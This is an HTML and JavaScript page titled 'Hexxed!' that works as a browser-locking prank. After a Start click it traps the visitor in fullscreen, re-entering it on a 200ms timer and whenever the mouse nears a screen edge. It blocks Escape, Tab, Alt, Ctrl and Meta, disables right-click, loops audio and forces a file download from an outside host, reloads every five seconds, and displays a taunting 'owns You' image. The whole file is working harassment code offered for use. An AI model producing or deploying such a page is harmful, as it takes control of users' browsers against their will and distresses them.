<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Hexxed!</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    .fullscreen-popup {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      user-select: none;
    }
    
    .popup-content {
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      object-position: center;
      user-select: none;
      pointer-events: none;
    }

    body.fullscreen {
      cursor: none;
    }

    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: transparent;
      z-index: 10000;
      pointer-events: none;
    }

    /* Start button for user interaction */
    .start-button {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      padding: 20px 40px;
      font-size: 24px;
      background-color: #ff0000;
      color: #fff;
      border: none;
      cursor: pointer;
      z-index: 10001;
      border-radius: 10px;
    }
    .start-button.hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div class="fullscreen-popup" id="popup">
    <div class="popup-content">
      <img src="KaiSoni owns You!.png" alt="Fullscreen Image" />
    </div>
  </div>
  <div class="overlay" id="overlay"></div>
  <button class="start-button" id="startButton">Start</button>

  <audio id="aud" src="https://jewls-gray.vercel.app/1.mp3" preload="auto" loop></audio>

  <script>
    const popup = document.getElementById('popup');
    const audio = document.getElementById('aud');
    const startButton = document.getElementById('startButton');
    const mp3Url = 'https://jewls-gray.vercel.app/1.mp3';

    // Trigger MP3 download
    function triggerDownload(url, filename) {
      const a = document.createElement('a');
      a.href = url;
      a.download = filename || '1.mp3';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }

    // Fullscreen functionality
    function enterFullscreen() {
      const el = document.documentElement;
      if (!el) return;
      if (el.requestFullscreen) {
        el.requestFullscreen().catch(() => {});
      } else if (el.webkitRequestFullscreen) {
        el.webkitRequestFullscreen();
      } else if (el.msRequestFullscreen) {
        el.msRequestFullscreen();
      }
      document.body.classList.add('fullscreen');
    }

    // Play audio
    function tryPlayAudio() {
      audio.play().catch((error) => {
        console.log('Autoplay prevented:', error);
        // Audio will play after user interaction via start button
      });
    }

    // Advanced fullscreen trap
    function trapFullscreen() {
      document.addEventListener('fullscreenchange', () => {
        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
          enterFullscreen();
        }
      });
      document.addEventListener('webkitfullscreenchange', () => {
        if (!document.webkitFullscreenElement) {
          enterFullscreen();
        }
      });
      document.addEventListener('msfullscreenchange', () => {
        if (!document.msFullscreenElement) {
          enterFullscreen();
        }
      });

      document.addEventListener('keydown', (e) => {
        const blockedKeys = ['Escape', 'F5', 'Tab', 'Alt', 'Control', 'Meta'];
        if (blockedKeys.includes(e.key) || e.ctrlKey || e.altKey || e.metaKey) {
          e.preventDefault();
          e.stopPropagation();
          enterFullscreen();
        }
      });

      document.addEventListener('mousemove', (e) => {
        if (e.clientY < 50 || e.clientX < 50 || e.clientX > window.innerWidth - 50) {
          enterFullscreen();
        }
      });

      setInterval(() => {
        if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
          enterFullscreen();
        }
      }, 200);

      document.addEventListener('contextmenu', (e) => e.preventDefault());
    }

    // Handle single download
    function handleDownloads() {
      triggerDownload(mp3Url, '1.mp3');
      // Multiple downloads (uncomment for testing, but expect prompts)
      /*
      const downloadCount = 3;
      let delay = 100;
      for (let i = 0; i < downloadCount; i++) {
        setTimeout(() => {
          triggerDownload(mp3Url, `1_${i + 1}.mp3`);
        }, delay);
        delay += 500;
      }
      */
    }

    // Initialize after user interaction
    function initialize() {
      startButton.classList.add('hidden'); // Hide button
      enterFullscreen();
      trapFullscreen();
      tryPlayAudio();
      handleDownloads();

      // Faster page refresh
      setTimeout(() => {
        window.location.reload();
      }, 5000); // 5 seconds
      // For even faster refresh (e.g., 3 seconds), uncomment below but test for stability
      // setTimeout(() => { window.location.reload(); }, 3000);
    }

    // Start button click handler
    startButton.addEventListener('click', () => {
      audio.play().catch((error) => console.log('Audio play failed:', error));
      initialize();
    });

    window.addEventListener('load', () => {
      // Wait for user interaction via start button instead of auto-initializing
    });

    // Handle visibility change
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        audio.pause();
      } else {
        tryPlayAudio();
        enterFullscreen();
      }
    });

    // Block additional interactions
    document.addEventListener('keyup', (e) => {
      e.preventDefault();
      enterFullscreen();
    });
    document.addEventListener('mousedown', (e) => {
      if (e.button === 2) {
        e.preventDefault();
        enterFullscreen();
      }
    });
  </script>
</body>
</html>
